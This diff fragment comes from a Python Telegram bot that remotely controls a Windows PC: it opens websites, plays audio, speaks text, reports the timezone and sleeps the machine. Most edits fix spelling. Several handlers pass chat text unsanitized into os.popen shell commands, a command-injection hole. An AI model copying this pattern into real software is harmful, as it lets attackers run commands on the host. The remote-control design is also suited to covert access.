-        bot.send_message(message.chat.id, 'Logged succesfuly!')
+        bot.send_message(message.chat.id, 'Logged successfully!')
         bot.send_message(message.chat.id, textovik)
     else:
         bot.send_message(message.chat.id, 'password is wrong')
+
+
+#################################################################################
+@bot.message_handler(commands=['examples'])
+
+def examples(message):
+    bot.send_message(message.chat.id, examplestext)
 
 #################################################################################
 
@@ -982,7 +1399,7 @@ def screen(message):
         engine = pyttsx3.init()
         engine.say(text)
         engine.runAndWait()
-        bot.send_message(message.chat.id , f'{text}  sended succesfuly!')
+        bot.send_message(message.chat.id , f'{text}  sended successfully!')
 
     except Exception as e:
         bot.send_message(message.chat.id , f'Error: {e}')
@@ -1071,12 +1488,7 @@ def information(message):
         
         result = os.popen('curl ipinfo.io/timezone').read().strip()
         bot.send_message(message.chat.id,f"Timezone:\n {result}")
-##################################################################################
-# about pc        
-        result = os.popen('wmic os get /format:list').read().strip()
-        bot.send_message(message.chat.id,'########################################')
-        bot.send_message(message.chat.id,f"Result:\n {result}")
-    
+
     except Exception as e:
         bot.send_message(message.chat.id, f"Error:{e}")
 #################################################################################
@@ -1193,7 +1605,7 @@ def plsound(message):
 
         os.popen(f'start {muspath}')
     
-        bot.send_message(message.chat.id, 'Music started playing in pc succesfuly')
+        bot.send_message(message.chat.id, 'Music started playing in pc successfully')
 
     except Exception as e:
         bot.send_message(message.chat.id, f'Error:{e}')    
@@ -1204,7 +1616,7 @@ def opensite(message):
     try:
         site = message.text.split('/chrome', 1)[1].strip()
         os.popen(f'start chrome "{site}"')
-        bot.send_message(message.chat.id, f'Site:{site} has opened succesfuly')
+        bot.send_message(message.chat.id, f'Site:{site} has opened successfully')
     except Exception as e:
         bot.send_message(message.chat.id, f'Error:{e}')
         
@@ -1216,7 +1628,7 @@ def opensite(message):
     try:
         site = message.text.split('/edge', 1)[1].strip()
         os.popen(f'start msedge "{site}"')
-        bot.send_message(message.chat.id, f'Site:{site} has opened succesfuly')
+        bot.send_message(message.chat.id, f'Site:{site} has opened successfully')
     except Exception as e:
         bot.send_message(message.chat.id, f'Error:{e}')
         
@@ -1228,7 +1640,7 @@ def opensite(message):
     try:
         site = message.text.split('/firefox', 1)[1].strip()
         os.popen(f'start firefox "{site}"')
-        bot.send_message(message.chat.id, f'Site:{site} has opened succesfuly')
+        bot.send_message(message.chat.id, f'Site:{site} has opened successfully')
     except Exception as e:
         bot.send_message(message.chat.id, f'Error:{e}')
         
@@ -1286,7 +1698,7 @@ current_directory = os.getcwd()
 def slip(message):
     try:
         ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
-        bot.send_message(message.chat.id, 'Pc is sendend to sleep!') 
+        bot.send_message(message.chat.id, 'Pc is sendend to sleep mode!') 
     except Exception as e:
         bot.send_message(message.chat.id, f"Error :(: {e}")
 
